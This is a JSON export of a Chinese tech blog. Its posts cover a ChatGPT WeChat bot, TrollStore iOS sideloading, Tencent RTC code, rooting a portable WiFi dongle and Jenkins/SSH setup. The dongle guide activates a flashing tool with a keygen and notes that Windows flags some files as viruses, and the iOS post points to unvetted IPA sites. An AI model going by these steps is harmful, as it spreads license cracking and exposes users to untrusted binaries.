{"meta":{"title":"游魂的网络日志","subtitle":"分享技术，记录点滴","description":"游魂的网络日志是一个分享前端开发技术的交流平台。","author":"Andy","url":"//www.shen.ee"},"pages":[{"title":"","date":"2022-06-23T09:57:29.836Z","updated":"2022-06-23T09:31:26.219Z","comments":true,"path":"serverless.json","permalink":"//www.shen.ee/serverless.json","excerpt":"","text":"{\"component\":\"website\",\"name\":\"coding-pages-416879-1119650-8173-421230\",\"org\":\"1251054566\",\"app\":\"hexo-blog\",\"stage\":\"dev\",\"inputs\":{\"region\":\"ap-hongkong\",\"src\":{\"error\":\"404.html\",\"index\":\"index.html\",\"src\":\"./\"},\"bucketName\":\"coding-pages-bucket-416879-1119650-8173-421230\",\"isAutoCiDeploy\":true,\"codePlatform\":\"CODING_OTHER_PROJ\",\"gitUrl\":\"https://e.coding.net/youhunwl/hexo-blog.git\",\"branch\":\"master\"}}"},{"title":"关于我","date":"2019-07-02T08:09:54.000Z","updated":"2021-11-15T07:55:36.547Z","comments":true,"path":"about/index.html","permalink":"//www.shen.ee/about/index.html","excerpt":"","text":"游魂 —— 生于北方，喜冬厌夏，性子很傲，过热不讨喜。 有代码洁癖，所以我的代码是干净整洁规范的 情怀敲代码，好心态才有好状态 向往新知识，每天进步一点点 前端码农一枚，确有着运维的心，会给大家分享技术软件、源码等等。随笔也记录下生活，多年之后偶尔翻翻，或许会有不一样的感觉，毕竟文字才是保存最长久的东西。 附上博主两张帅照😄（设个门槛吧） aHR0cHM6Ly93d3cuaXlvdWh1bi5jb20vY29udGVudC91cGxvYWRmaWxlLzIwMTcwNC8zMTQyNDYxOTc0NTcyODY3NDIuanBn aHR0cHM6Ly93d3cuaXlvdWh1bi5jb20vY29udGVudC91cGxvYWRmaWxlLzIwMTcwNC8zMzY1MzQyODAzODMwNDE3MTcuanBn 关于本站博客框架：hexo 服务托管：coding pages（国内）、github pages（海外） 域名解析：DNSPod 图片存储：又拍云 自 动 化：Jenkins 联系方式邮箱：admin#iyouhun.com（#请替换为@） GitHub：github.com/youhunwl 新浪微博：万哥Stars"}],"posts":[{"title":"OpenAI ChatGPT 接入微信，与AI互动！","slug":"OpenAI ChatGPT 接入微信，与AI互动！","date":"2022-12-11T04:38:39.000Z","updated":"2022-12-16T01:35:24.912Z","comments":true,"path":"article/35220.html","link":"","permalink":"//www.shen.ee/article/35220.html","excerpt":"","text":"最近的热门话题，OpenAI 推出的ChatGPT绝对榜上有名！但是不说注册难度，只说每次需要一些不可抗力的原因才能访问使用就很麻烦，大部分人无法体验到，本文介绍的方式直接对接个人微信（不是公众号）非常平民！基本上有电脑就能自己搭建，文末有免费体验。 ChatGPT是什么？ChatGPT是一款开源的聊天机器人框架，它使用了OpenAI的GPT-3语言模型，可以实现自然语言处理、问答和对话生成等功能。通俗的说就是一款AI聊天机器人 。 它可以在模仿人类说话风格的同时回答大量的问题 它可以帮助程序员写出一段代码 也可以帮你计算 总之可以回答很多问题 注册ChatGPT攻略网上的文章很多，这里就不重复写了。需要注意的就是网络、国外手机号。 可以参考文章：OpenAI 推出超神 ChatGPT 注册攻略来了 接入个人微信准备工作 OpenAI 账号（前提账号有信誉额度，一般为18美元，注册就送） 微信账号 （建议小号） API Key 获取API Key教程（配置文件需要填写API Key) 登陆 OpenAI - 右上角头像 - View API keys 点击 Create new secret key API Key 创建成功后复制收藏好这个Key接下来会用到，点击OK后，Key不会再完整显示。只能删了重新生成Key！ 开源项目https://github.com/869413421/wechatbot 项目基于openwechat 开发的，微信的SDK，请移步这个仓库查看：https://github.com/eatmoreapple/openwechat 鉴于国内访问Github困难 可以使用代理：https://ghproxy.com/ 部署方式一Windows 和 Linux都可以，但是本机需要有Golang环境。参考：Linux服务器搭建部署GO环境 然后直接编译运行项目即可。推荐有一定的技术的童鞋看这部分，不懂技术移步方式二。 拉取代码，安装依赖。 123git clone https://ghproxy.com/https://github.com/869413421/wechatbotcd wechat-chatGPTgo mod tidy 启动运行项目 1go run main.go 方式二这部分建议不太懂技术或嫌编译麻烦的童鞋参考，一把梭哈部署！ Windows 和 Linux都可以，本地不需Golang环境。下载可执行文件直接启动运行。 下载地址：https://gitee.com/shtml/wechatbot/tree/main/bin 下载你本系统需要的可执行文件和配置文件（config.json），注意修改配置文件（下面有描述）！ 注意：可执行文件 和 配置文件放到同一个目录！ 启动运行，Windows直接双击运行即可！ 修改配置文件新建配置文件 config.json 1234&#123; \"api_key\": \"your api key\", \"auto_pass\": true&#125; your api key 位置，粘贴上面你获取到的API key。 auto_pass 是否自动通过好友请求（如果人非常多加好友，建议设置成 false，因为频繁好友申请会导致程序崩溃） 启动运行程序启动成功后，浏览器会弹窗一个二维码。直接使用你的微信（微信机器人）扫码登陆即可。 如果Linux服务器上启动，将日志中的图片地址在自己的浏览器打开扫码即可。 1234访问下面网址扫描二维码登录https://login.weixin.qq.com/qrcode/gdOa1pgupQ==2022/12/11 08:19:50 扫码成功,请在手机上确认登录2022/12/11 08:20:01 登录成功 微信登陆成功以后，在可执行文件所在的目录多了一个 storage.json 文件。 下次启动程序无需再次扫码登陆微信就能使用了！ 却换到其他微信登录一定要将这个 storage.json 文件删除掉，否则会切换失败。 12022/12/11 08:19:33 login error: write storage.json: bad file descriptor 微信聊天微信机器人可以通过群聊中@ 或者 私聊，解答各种问题。 私聊 群聊@ 体验 Bot微信搜索添加 iyouhun，发送关键词 AI体验 即可自动拉进体验群","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"OpenAI","slug":"OpenAI","permalink":"//www.shen.ee/tags/OpenAI/"},{"name":"ChatGPT","slug":"ChatGPT","permalink":"//www.shen.ee/tags/ChatGPT/"},{"name":"AI聊天","slug":"AI聊天","permalink":"//www.shen.ee/tags/AI聊天/"},{"name":"AI聊天机器人","slug":"AI聊天机器人","permalink":"//www.shen.ee/tags/AI聊天机器人/"},{"name":"微信机器人","slug":"微信机器人","permalink":"//www.shen.ee/tags/微信机器人/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"【免越狱】IOS第三方软件永久安装方法汇总！绕过证书限制！大部分系统版本适用！附各种第三方软件分享","slug":"【免越狱】IOS第三方软件永久安装方法汇总！绕过证书限制！大部分系 统版本适用！附各种第三方软件分享","date":"2022-11-11T05:50:39.000Z","updated":"2022-12-16T01:33:33.382Z","comments":true,"path":"article/42702.html","link":"","permalink":"//www.shen.ee/article/42702.html","excerpt":"","text":"前言众所周知，ios系统在因其系统生态的封闭性，隐私性，安全性的考虑，一直对第三方软件限制的非常严重；想安装第三方ipa软件，在早些时候，只有越狱这一条路可走。越狱当然行，但即便不考虑越狱后的稳定性，也有一部分小伙伴，仅仅只有安装个别第三方软件的一个需求，为此而越狱，略显小题大做了。 后来可以利用证书来签名第三方软件，但这种方法一直都有一个缺点，那就是受到证书有效期的限制，个人证书只有7天，还需借助电脑，开发者和企业证书虽然时间长，但大都不是免费的，收费而且极不稳定，属于无奈之选。 现在有了 TrollStore 中文巨魔 永久签名工具，可以免证书永久安装第三方ipa软件【部分型号处理器免越狱且不受关机重启限制】 巨魔 TrollStore 永久签名工具 Github 地址：https://github.com/opa334/TrollStore 什么是TrollStore？ TrollStore是一款iOS应用程序,用于在iOS 14和iOS 15上签名和安装IPA文件,而不需要签名，通常这种行为需要在越狱后才能实现的功能，而它不需要。这个APP翻译过来为巨魔。它无需帐户，无需登录，无需证书，无需越狱，IPA 安装后永不过期，完全免费，使用简单方便。 我的手机能用TrollStore吗？ 首先需要你的手机是苹果手机其次就是CPU处理器是A8-A15（iPhone6 - iPhone13）系列并且系统版本是14.0-15.41（15.5 beta1-4/15.6 beta1-4）才可以使用。可以看下作者Github给出的列表。 安装巨魔一、准备工作 看清楚你手机的系统版本和处理器，是否都符合，符合就继续，不符合是肯定无法成功的！教程全程无需电脑！ 系统版本查看方法：设置-通用-关于本机-软件版本 处理器型号查看方法：打开百度输入：iPhone 13 是什么处理器？iPhone 14 Pro 是什么处理器？ 二、各种版本安装方法汇总 这里为了方便不同的版本我称作版本 A、版本 B、版本 C，请根据自己情况安装 版本A安装方法iOS/iPadOS 系统版本：15.0-15.5 beta4 处理器：A9-A15 必须二者都符合 1、复制链接：https://api.jailbreaks.app/troll 2、使用自带 Safari 浏览器【粘贴并前往】点击打开并安装，安装完成后设备桌面会出现【GTA Car Tracker】图标 3、打开 GTA Car Tracker (如果这个 app 没有直接出现，重启设备即可)，点击 Install TrollStore 安装 TrollStore 4、上面一步如果点击 Install TrollStore出现error 报错，显示“似乎已断开与互联网的连接”解决方法： 删掉刚刚安装的GTA Car Tracker软件 打开 App Store 搜索GTA Car Tracker 软件，安装后打开软件，出现联网弹窗，允许网络权限——无限局域网与蜂窝网络 之后就可以删除这个 App store版本的GTA Car Tracker软件。再重新回到最开始的第一步：用复制蓝色链接的方法，去安装GTA Car Tracker 5、如果没有出现报错，请继续：成功安装 TrollStore 工具后，TrollStore 图标会出现在主屏幕上。打开 TrollStore 点击底部【Settings】，再点击【Install ldid】，以便 TrollStore 可以安装未签名的应用程序。 版本B安装方法iOS/iPadOS 系统版本：14.x 处理器：A12-A14 必须二者都符合 1、复制链接：https://api.jailbreaks.app/troll64e 【请注意，和上面蓝色链接不一样！】 2、使用自带 Safari 浏览器【粘贴并前往】点击打开并安装，安装完成后设备桌面会出现【GTA Car Tracker】图标 3、打开 GTA Car Tracker (如果这个 app 没有直接出现，重启设备即可)，点击 Install TrollStore 安装 TrollStore、 4、如果出现error报错，还按上面方法解决。 5、如果没有出现报错，成功安装 TrollStore 工具后，TrollStore 图标会出现在主屏幕上。打开 TrollStore 点击底部【Settings】，再点击【Install ldid】，以便 TrollStore 可以安装未签名的应用程序。 版本C安装方法iOS/iPadOS 系统版本：14.x 处理器：A9-A11 必须二者都符合 注：14.x 且处理器为a9-a11的利用方法似乎有些问题，暂不能免越狱实现，请使用checkra1n + TrollHelper的方法安装 （可在 Havoc 源 https://havoc.app/ 上安装TrollStore Helper）此教程不再提供详细越狱方法。 不建议已越狱的用户使用 TrollStore 因为越狱了本身就可以不用签名安装应用 利用TrollStore安装/卸载第三方ipa软件1、将需要安装的应用程序 IPA 安装包下载到 iPhone/iPad上，选择 TrollStore 打开就会自动开始安装，完成后就可以永久有效打开安装的免签名 App 2、如果桌面没有出现图标，可以点击 TrollStore 底部 Settings 里的 Respring 注销一次桌面 3、如果想要卸载安装的 App，直接在 TrollStore 底部 Apps 左滑 Delete 删除 4、微信或者QQ等软件，可以直接点击【其他应用打开】按钮，选择TrollStore打开 如何找到第三方ipa安装包 注：任何第三方网站ipa资源都没有说100%绝对安全，安装使用前自行斟酌。 1、大神汇总：（看不懂不要乱装） https://github.com/34306/TrollStoreiPA/releases/tag/TS_DailyiPA 2、开发者原版部分ipa包： 开发者原版 Filza IPA 【系统文件管理器】下载地址：https://tigisoftware.com/download/Filza_3.9.7.ipa 开发者原版 Apps Manager IPA 【功能强大的app管理器】下载地址：https://tigisoftware.com/download/AppsManager_1.7.0.ipa 开发者原版 TrollNonce IPA 【固定G值】下载地址：https://github.com/opa334/TrollNonce/releases/download/1.0.1/TrollNonce.ipa 开发者原版 AppStore++ IPA 【免越狱在App Store下载老版本软件】下载地址：https://github.com/CokePokes/AppStorePlus-TrollStore/releases/download/v1.2-1/AppStore++_TrollStore_v1.2-1.ipa 开发者原版 Mugunghwa IPA 【免越狱美化软件】下载地址：https://github.com/s8ngyu/Mugunghwa/releases/download/2.0.3/Mugunghwa.ipa 3、网友分享ipa软件包，包含了多开微信等 https://pan.ios98.com https://pan.iosapp.top https://iosapp6.top http://pan.jd888.ml/Onedrive 常见问题TrollStore 无法安装 app成功安装 TrollStore 工具后，需要点击 TrollStore 底部【Settings】，再点击【Install ldid】，这样 TrollStore 才能安装未签名的应用程序（当然并不是所有 IPA 都支持 TrollStore 安装，但绝大部分都可以） 重启后 TrollStore 安装的 app 闪退由于 iOS 15.x 是无根模式，安装了 TrollStore之后，点击 TrollStore-Settings-Install Persistence Helper，选择一个自己不用的系统自带应用注入（比如 Tips【提示】app），这样设备重启后，如果 TrollStore 安装的 app 或者它自己出现闪退，那就可以点击之前选择的注入应用（比如 Tips【提示】app），重新激活即可正常打开。 TrollStore 如何更新版本TrollStore 1.1 版本开始内置一键更新按钮，当有新版本推送时，会在 Settings 顶部出现更新按钮，点击即可自动更新安装。","categories":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}],"tags":[{"name":"巨魔","slug":"巨魔","permalink":"//www.shen.ee/tags/巨魔/"},{"name":"TrollStore","slug":"TrollStore","permalink":"//www.shen.ee/tags/TrollStore/"},{"name":"ios安装ipa","slug":"ios安装ipa","permalink":"//www.shen.ee/tags/ios安装ipa/"},{"name":"ios免越狱","slug":"ios免越狱","permalink":"//www.shen.ee/tags/ios免越狱/"},{"name":"ios签名","slug":"ios签名","permalink":"//www.shen.ee/tags/ios签名/"},{"name":"ios多开","slug":"ios多开","permalink":"//www.shen.ee/tags/ios多开/"},{"name":"ios微信多开","slug":"ios微信多开","permalink":"//www.shen.ee/tags/ios微信多开/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}]},{"title":"IM腾讯实时音视频小记","slug":"IM腾讯实时音视频小记","date":"2022-09-26T02:54:39.000Z","updated":"2022-12-16T01:31:49.197Z","comments":true,"path":"article/37442.html","link":"","permalink":"//www.shen.ee/article/37442.html","excerpt":"","text":"Uniapp使用腾讯实时音视频（demo） 在插件市场购买插件(0元) https://ext.dcloud.net.cn/plugin?id=9035 输入安卓包名（hbuilder点击发行 原生app云打包之后可以看到包名） 配置插件 完成步骤1后 打包（发行 原生app云打包）使用公共测试证书 自定义调试基座 然后运行到安卓app基座（连接手机调试) 第一行引入原生插件（只能在app中生效），其它是腾讯云的配置，userId自己定义，userSig建议服务端生成（https://cloud.tencent.com/document/product/647/17275) 12345const TUICallKit = uni.requireNativePlugin('TencentCloud-TUICallKit')const TUICallingEvent = uni.requireNativePlugin('globalEvent')const sdkAppId = 1400737560const userId = 'xxx'const userSig = 'eJyrVgrxCdYrSy1S...' 1234567891011121314151617181920212223242526272829created() &#123; const options = &#123; SDKAppID: sdkAppId, userID: userId, userSig: userSig, &#125; TUICallKit.login(options, (res) =&gt; &#123; if (res.code === 0) &#123; console.log('已登录') &#125; else &#123; console.log(`login failed, error message = $&#123;res.msg&#125;`) &#125; &#125;) TUICallingEvent.addEventListener('onError', (res) =&gt; &#123; console.log('onError', JSON.stringify(res)) &#125;) TUICallingEvent.addEventListener('onCallReceived', (res) =&gt; &#123; console.log('onCallReceived', JSON.stringify(res)) &#125;) TUICallingEvent.addEventListener('onCallCancelled', (res) =&gt; &#123; console.log('onCallCancelled', res) &#125;) TUICallingEvent.addEventListener('onCallBegin', (res) =&gt; &#123; console.log('onCallBegin', JSON.stringify(res)) &#125;) TUICallingEvent.addEventListener('onCallEnd', (res) =&gt; &#123; console.log('onCallEnd', JSON.stringify(res)) &#125;)&#125; 之后就可以根据文档操作了，发起挂断事件监听（https://cloud.tencent.com/document/product/647/78762) Web使用腾讯实时音视频（demo） 测试使用script引入 也可以使用npm（https://cloud.tencent.com/document/product/647/78731） 1234&lt;script src=\"./trtc-js-sdk/trtc.js\"&gt;&lt;/script&gt;&lt;script src=\"./tim-js-sdk/tim-js.js\"&gt;&lt;/script&gt;&lt;script src=\"./tsignaling/tsignaling-js.js\"&gt;&lt;/script&gt;&lt;script src=\"./tuicall- engine-webrtc/tuicall-engine-webrtc.js\"&gt;&lt;/script&gt; 引入客户端生成userSig相关文件 123&lt;script src=\"./js/clipboard.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/lib-generate-test-usersig.min.js\"&gt;&lt;/script&gt;&lt;script src=\"./js/generateTestUserSig.js\"&gt;&lt;/script&gt; 传入参数 登录，之后就可以呼叫 监听事件等等（https://cloud.tencent.com/document/product/647/78756） 123456789101112131415161718const &#123; TUICallEngine, TUICallEvent &#125; = window['tuicall-engine-webrtc'] let options = &#123; SDKAppID: sdkAppId, // 接入时需要将 0 替换为您的云通信应用的 SDKAppID tim: null // tim 参数适用于业务中已存在 TIM 实例，为保证 TIM 实例唯一性 &#125; console.log() let tuiCallEngine = TUICallEngine.createInstance(options); tuiCallEngine.login(&#123; userID: userId, userSig: userSig, &#125;).then(res =&gt; &#123; // success &#125;).catch(error =&gt; &#123; console.warn('login error:', error) &#125;) Web端没看到有通话组件的（呼叫界面、接听界面） 踩坑 如果呼叫一个从未登录过得用户 不会唤起UI 只会提示呼叫成功 当你呼叫未登录过得用户后，再去呼叫正常的用户也不会拉起UI","categories":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}],"tags":[{"name":"实时音视频","slug":"实时音视频","permalink":"//www.shen.ee/tags/实时音视频/"},{"name":"IM实时音视频","slug":"IM实时音视频","permalink":"//www.shen.ee/tags/IM实时音视频/"},{"name":"前端实时音视频","slug":"前端实时音视频","permalink":"//www.shen.ee/tags/前端实时音视频/"},{"name":"腾讯实时音视频","slug":"腾讯实时音视频","permalink":"//www.shen.ee/tags/腾讯实时音视频/"},{"name":"TUICallKit","slug":"TUICallKit","permalink":"//www.shen.ee/tags/TUICallKit/"}],"keywords":[{"name":"前端","slug":"前端","permalink":"//www.shen.ee/categories/前端/"}]},{"title":"随身wifi刷机折腾记","slug":"随身wifi刷机折腾记","date":"2022-06-28T03:23:59.000Z","updated":"2022-06-28T03:25:18.098Z","comments":true,"path":"article/11627.html","link":"","permalink":"//www.shen.ee/article/11627.html","excerpt":"","text":"前言首先感谢酷安随身 Wi-FI社区，里面有很多参考资料，但是对小白上手不太友好，刚好我也是第一次刷，所以我这边就写了一篇完整的图文教程，希望可以帮到你。 购买随身 Wi-Fi现在市面上的大部分随身 Wi-Fi 除了最基本充当网络热点的功能以外，它还是一块非常标准的高通410/210开发板（这取决于你的购买），而且它跑的还是安卓系统。可以刷 debian 系统，甚至你还能刷 openwrt 成为软路由，更棒的是 4G 和 Wi-Fi 、USB 等功能都正常工作。 一般的商家宣传说的无需插卡其实都是内置了 eSIM卡，但大部分还是留有卡槽(大卡槽，小卡需要卡套)，切记不要激活他内置的流量卡，说白了就是物联网卡，流量不仅贵不说而且还虚标！ 我是在京东买的讯唐，日常活动券后价 29，买最基础的就行，链接：https://u.jd.com/cdVKZYw 用完红包一系列骚操作下来9块钱拿下。 插入一个小小的开箱环节到货，有点廉价感 中规中矩的外观，没办法直接插卡，需要拆卸装卡 拔掉 USB 帽，背面可以看到两个螺钉，先不要急着拆看后面的检查！ 推荐随身 Wi-Fi 来源网络，你可以根据你的情况来，也可以直接上我买的那个讯唐 12345铁恒信旗舰店 54 元款：UFI003 （后台密码 admin、切卡密码 UFIadmin1234）天天特卖工厂店 29 元款：SP970-Main-v2（后台：admin admin，切卡用酷安工具，无法直接进 9008，openwrt wifi 有问题不推荐）酷翼旗舰店 8.8 元款：UFI003 （后台密码 admin、切卡密码 无）纽皇 6.8 元款：可能是 UFI001W ？？？（后台密码 admin、切卡密码：qr0521）但会抽奖碰到高通 210 款天天特卖工厂店 28 元款 UFI001 C （后台密码 admin、切卡密码：UFIadmin1234，现在改成没卡槽了） 准备工作 高通410（msm8916）方案的随身 Wi-Fi：板子上的丝印是 UFI001B、UFI001C、UFI003、UFI-W-001 最好，或者 SP970（不推荐，细分版本目前13个太多，基本要短接才能进 9008 模式，然后现在的 openwrt Wi-Fi 也有问题）、UZ801 也 OK；需要带卡槽、能切卡。 一台 Windows 电脑（建议安装火绒，一些文件会被 Win 默认防护当病毒删除） 小卡转大卡 SIM 卡套 螺丝刀（拧随身 Wi-Fi 十字小螺丝） 下载工具和资源 刷机需要的工具文件（访问码：h5ft） 「苏苏小亮亮」编译的 openwrt 术语 进入 9008模式 就是按住板子上的复位按钮，如果没拆机那就拿针按住然后插入电脑 可以从电脑的设备管理器查看端口有无 9008 面具（Magisk） Magisk是一套用于定制 Android的开源工具 root、引导脚本、 SELInux修补、移除AVB2.0/dm- verity/强制加密等 主打模块管理功能的软件，有了它后边你就可以安装免流模块或者 V2，本文不做讨论 adb adb的全称为Android Debug Bridge 起到调试桥的作用，简单来说就是可以通过这个命令用电脑控制手机。 fastboot模式 翻译过来就是快速启动 fastboot是一种比recovery更底层的刷机模式 使用USB数据线连接手机的一种刷机模式 基础安装安装9008驱动我们先安装需要的9008驱动。打开9008免签名驱动文件夹，安装驱动。 点击立即安装即可。 安装高通刷机工具打开 Qualcomm Premium Tool V2.4 文件夹。 先用注册机生成.key文件。 保存.key文件 打开Premium Tool v2.4。点击Help下的Activate激活，选择你刚才保存的.key文件即可激活成功 安装ARDC投屏软件并进行简单优化安装打开 投屏软件 ARDC 文件夹，安装ARDC，请保持默认，一路确认即可。 拔掉随身Wifi，重新插回电脑，此时设备灯亮，说明进入正常adb模式了。 打开ARDC，程序会通过adb的方式推送投屏软件到随身Wifi上。完成以后如图所示，点击鼠标右键进入桌面。 桌面 优化毕竟这么小的设备上跑安卓系统，我们可以做一下优化，要不然太卡了。 进入设置 =&gt; 关于本机 =&gt; 点击 10 次版本号进入开发者模式，把所有动画特效都关掉。 检查和备份检查请先确认插上随身Wifi后，电脑是不是识别出来了硬件，诸如adb或者Android的字眼，这都意味着你的机器是可以不拆机破解的，他的adb端口是开的。连上随身 Wi-Fi 提供的 Wi-Fi，进入后台，检查下是否能正常工作，防止到手就是坏的。 然后用螺丝刀拆开检查板子，是否有卡槽，以及上面的版本丝印。 如下图，小按钮旁边那个就是卡槽，注意：图中最左边的顶部那里是信号天线，有些人拆了之后插卡测试没网或者信号不好可能就是忘记装了这个东西！ 我的这款丝印是：UFI003_MB_V002 三网通，不用切卡不用刷基带，插卡直接用！忽然没了折腾的意义，哈哈哈。 检查的重要性 酷安一个友友，和我的设备一样。私信我他刚买来插卡没有网络… 备份原厂固件分区镜像做好全量备份就不会变砖，随时刷成到手的状态。 进入 9008 模式，打开Premium Tool v2.4。 依次点击Qualcomm 、partition，然后点击Scan分区、Do job扫描。 再依次点击Backup，Backup All，Do job备份即可 制作救砖包安装Miko_pro，并复制loader.exe到安装目录。打开loader.exe。 然后在 miko 里依次选择 Read ，Partition Backup/Earese 点击左下角 Load Partition Structure 看到右边有系统信息的输出就说明连上了 然后点击 Read Full Image 选个路径，取个名字就开始全量备份救砖能用的 .bin 文件。过程会比较慢，可能要十几分钟。 等到跑完进度条 100% 右边的输出显示 success 就备份好了，我们就能开始随意折腾。 备份原厂基带打开 星海恢复 备份 生成 修改QCN工具 文件夹中的星海SVIP 随身wifi正常工作状态下，点击上方的高通，先点击联机，再点击备份QCN，选择路径来备份你的基带。点击一键执行即可。 刷入面具（Magist）获取 Root 权限方式一安装Magist 随身 Wi-Fi 插在电脑上，打开 ARDC 投屏软件，等待设备投屏成功。 直接将资源面具Magist文件夹里的Magisk-v22.0.apk拖动到 ARDC 窗口中 修补面具 随身Wifi插在电脑上不要动，打开 搞机工具箱_钟晨酱 文件夹 先点击Fastboot(BL)进入Fastboot模式 然后分区选择Boot, 右侧选择14.5magisk修补boot.img然后输入即可。刷写速度非常快，提示完成即可关闭。 接着拔掉随身wifi并重新插入，打开ardc，进入桌面打开magisk。可以看到当前已安装，并获得了root权限。 方式二 也可以直接刷入一些整合镜像内就包含了面具及一些常用软件。 我这里用的是酷安一个大佬分享的可以一键刷入UFI003 按复位按钮插入电脑，进入 9008 模式，打开MiFlash，点击刷新查看设备是否连接上。 点击浏览选择刷机包，选择保留所有数据，点击刷机即可。 时间有点慢，耐心等待一下，成功状态列会有显示。 成功后可以直接打开ARDC查看。 Ps：不要随便刷入整合镜像！除非和你是同品牌同型号！ 一些问题不支持全网通(刷写基带)大部分 UFI00X 丝印的随身 Wi-Fi 都是支持电信卡的，很多其实也支持联通，移动大概率默认是不支持的。当然因为产品众多，甚至丝印型号相同用的 modem 型号都有差别，当然最麻烦的其实也是这一步，不能保证你刷了基带后移动联通就能正常使用，还是更推荐电信或联通用户使用。 先使用搞机工具箱重启进入 fastboot 模式。 然后打开`星海工具箱 =&gt; 选择高通 =&gt; 选择高通基带擦除 =&gt; 一键执行，完成后会重启。(如果你的星海无法打开你可能得安装下微软的这个包) 然后勾选写入 QCN，选择全网通的基带写入。会可能一次写入不成功，多写入几次。重启随身 Wi-Fi，看看你的卡能不能正常工作。 默认没开 adb 的设备如果你的型号是 UFI001W 等，可能你到手设备并没有打开 adb 功能，你可以在 web 管理后台尝试重置。例如我讯唐的后台地址是：192.168.100.1，其他的参照你随身WiFi的说明书或者随身WiFi机身上的地址。 如果仍然不行。直接 9008 模式用 miflash 工具刷别人改好的包（安装面具的方式二就是），浏览里选择下载解压好的包，刷新勾选设备，点击刷机即可。会直接开启adb、锁定插入的 SIM 卡、和 root 等功能。 成砖挽救备份大法好，备份大法好，备份大法好！ 进入9008模式，进入miko，点击flash，点击emmc block0 flasher。 下方选择备份部分制作救砖包中生成的救砖包（.bin文件），耐心等待刷入即可。 刷好后插入别的卡没网络很有可能是你刷入了整合包，自带了锁定 SIM 卡功能，可以插卡重新刷写一遍试试。 烫得要死随身WiFi用一段时间就会发热的厉害，甚至自动关机。没办法本来就这么一个小小躯体承载了太多，动手能力强的可以自己淘宝买一些小风扇或者散热片改装一下，手残的可以直接买别人改好的。 可按照该商品规格购买：https://m.tb.cn/h.fvmcIWv?tk=XCOV2LYWDGA 来个总结目前随身 WiFi 市场除了大品牌有自研芯片、方案。大部分无良商家都是贴牌，成本很便宜也懒得去给加各种限制，采用相同的方案那就意味着大部分都可以刷机，刷机方法大同小异，最多就是刷机包的不同。而且目前社区解决方案多，资料完善，破解方便。 可能大家感觉折腾下来和刚买来没什么区别，但是我们首先不需要使用商家内置的SIM卡了，而且永久解锁SIM卡槽，防止商家远程施法！本文只是基础的刷机 root，但是相当于打通了任督二脉，无往而不利，接下来你随便折腾！可以刷入openwrt做旁路由、刷入debian做小型服务器等… 万物皆可刷！ 最后，9块钱的随身 WiFi 真香，拜了个拜！","categories":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}],"tags":[{"name":"随身Wifi刷机","slug":"随身Wifi刷机","permalink":"//www.shen.ee/tags/随身Wifi刷机/"},{"name":"随身Wifi破解","slug":"随身Wifi破解","permalink":"//www.shen.ee/tags/随身Wifi破解/"},{"name":"随身Wifi免流","slug":"随身Wifi免流","permalink":"//www.shen.ee/tags/随身Wifi免流/"},{"name":"随身Wifi刷入面具","slug":"随身Wifi刷入面具","permalink":"//www.shen.ee/tags/随身Wifi刷入面具/"},{"name":"随身WiFi-Root","slug":"随身WiFi-Root","permalink":"//www.shen.ee/tags/随身WiFi-Root/"},{"name":"随身wifi固件","slug":"随身wifi固件","permalink":"//www.shen.ee/tags/随身wifi固件/"},{"name":"随身WiFi刷写boot","slug":"随身WiFi刷写boot","permalink":"//www.shen.ee/tags/随身WiFi刷写boot/"}],"keywords":[{"name":"资源","slug":"资源","permalink":"//www.shen.ee/categories/资源/"}]},{"title":"Jenkins Generic Webhook Trigger 插件使用","slug":"Jenkins Generic Webhook Trigger 插件使用","date":"2022-06-22T03:01:39.000Z","updated":"2022-06-22T06:24:25.993Z","comments":true,"path":"article/27057.html","link":"","permalink":"//www.shen.ee/article/27057.html","excerpt":"","text":"Coding项目 Webhook 设置1.进入项目设置 =&gt; 开发者选项 =&gt; Service Hook =&gt; 新建Service Hook 2.根据你的项目选择不同的事件触发类型及过滤条件 3.配置发送方式 执行动作：默认就行 服务URL：就是你的generic-webhook-trigger调用地址，http://JENKINS_URL/generic-webhook-trigger/invoke 例如：http://108.108.108.108:8080/generic-webhook-trigger/invoke 构建 Token：自定义即可，下面项目发布设置会用到 其他不必填的根据自己实际需求填写 项目发布设置1.点击 Jenkins项目的构建环境 2.选择 Generic Webhook Trigger 3.输入对应 token 保存 push 一下，成功自动构建","categories":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}],"tags":[{"name":"Jenkins","slug":"Jenkins","permalink":"//www.shen.ee/tags/Jenkins/"},{"name":"Generic Webhook Trigger","slug":"Generic-Webhook-Trigger","permalink":"//www.shen.ee/tags/Generic-Webhook-Trigger/"},{"name":"jenkins插件","slug":"jenkins插件","permalink":"//www.shen.ee/tags/jenkins插件/"},{"name":"coding插件","slug":"coding插件","permalink":"//www.shen.ee/tags/coding插件/"}],"keywords":[{"name":"工具","slug":"工具","permalink":"//www.shen.ee/categories/工具/"}]},{"title":"Jenkins Publish over SSH 插件配置及服务器互信","slug":"Jenkins Publish over SSH 插件配置及服务器互信","date":"2022-06-22T02:53:39.000Z","updated":"2022-06-22T06:24:25.994Z","comments":true,"path":"article/29773.html","link":"","permalink":"//www.shen.ee/article/29773.html","excerpt":"","text":"服务器互信 A服务器：Jenkins 所在服务器 B 服务器：项目部署所在服务器 A 服务器生成秘钥 12ssh-keygen# 一路回车 A 服务器 将本地的ssh公钥文件安装到远程主机对应的账户下 （也可以手动复制，推荐命令） 12345678910111213141516171819# 执行命令后输入密码完成复制ssh-copy-id root@B服务器IP#端口不一致复制方法ssh-copy-id -i /root/.ssh/id_rsa.pub \"-p 1008 root@B服务器IP\"# 使用该命令测试ssh root@B服务器IP# 登录后注意此时主机名已经是 B 服务器的了 查看命令hostname# 修改主机名 centos6vim /etc/sysconfig/network #编辑network文件修改hostname行（重启生效）# 检查修改cat /etc/sysconfig/network# 修改主机名 centos7hostnamectl set-hostname www.iyouhun.com # 使用这个命令会立即生效且重启也生效 复制后的文件在 home/用户名/.ssh/文件下名为 authorized_keys 12345# 比如 新建了一个 Jenkins账户cat /home/jenkins/.ssh/authorized_keys# root 账户在cat /root/.ssh/authorized_keys Publish over SSH 插件配置Passphrase： 